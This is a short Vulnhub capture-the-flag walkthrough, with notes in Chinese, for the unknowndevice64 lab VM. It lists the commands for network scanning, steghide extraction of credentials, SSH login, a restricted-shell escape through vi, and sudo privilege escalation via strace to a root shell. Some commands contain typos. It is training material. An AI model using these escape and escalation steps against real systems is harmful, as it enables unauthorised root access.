## 1: Vulnhub Lab Walkthrough

###### #beginner

### **Penetrating Methodology:**

- IP Discovery using netdiscover
- Network scanning (Nmap)
- Surfing HTTP service port
- Finding image File
- Extracting the hidden file from the image
- Logging in through SSH
- Escaping restricted shell (逃避受限制的shell)
- Finding binary in sudoers list
- Getting the root shell and finding the flag

---

`netdiscover`

`nmap -p- -sV 192.168.1.104`

`url:http://192.168.1.104:31337/key_is_hldd3n.jpg`

`steghide extract -sf key_is_h1dd3n.jpg`

使用这个[网站](https://www.splitbrain.org/_static/ook/)将得到的加密的字符串进行解密，得到用户名和密码：`ud64:1M!#64@ud`

`ssh ud64:@192.168.1.104 -p 1337`

`id && echo $SHELL && echo $PATH`

使用vi 时执行命令`:!/bin/bash`

`export SHELL=/bin/bash:$SHELL`

`export PATH=/usr/bin:$PATH`

`sudo -l`

`sudo sysud64 -h | less`

`sudo sysud64 -o /dev/null /bin/sh` [^1]

`id`

[原文](https://www.hackingarticles.in/unknowndevice64-1-vulnhub-lab-walkthrough/)

---

[^1]: 因为我们可以使用sysud64作为root，而sysud64实际上正在运行strace命令。我们可以使用“sysud64”以root用户的身份生成shell。以root用户身份生成shell后，我们切换到根目录

